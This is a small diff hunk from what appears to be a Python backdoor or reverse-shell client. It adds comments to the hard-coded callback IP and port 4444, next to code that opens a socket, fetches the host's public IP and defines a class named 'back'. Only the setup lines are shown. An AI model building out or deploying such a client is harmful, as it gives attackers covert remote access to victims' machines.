@@ -25,8 +25,8 @@ e = False
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
-ip = "192.168.1.6"
-port = 4444
+ip = "192.168.1.6" # change this ofc ;-;
+port = 4444 # change this too if u want ;-;
 ipadd = get('https://api.ipify.org').text
 
 class back:
